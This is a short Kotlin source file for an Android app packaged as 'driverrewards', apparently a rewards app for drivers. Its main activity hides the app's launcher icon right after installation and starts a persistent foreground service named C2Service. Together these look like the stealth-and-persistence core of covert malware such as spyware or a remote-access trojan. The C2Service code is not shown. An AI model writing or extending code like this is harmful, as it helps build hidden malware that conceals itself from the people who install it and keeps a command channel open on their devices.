package com.sm.driverrewards

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Hide launcher icon post-installation
        hideAppIcon()

        // Start persistent background service safely
        val serviceIntent = Intent(this, C2Service::class.java)
        startForegroundService(serviceIntent)
    }

    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java.name)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
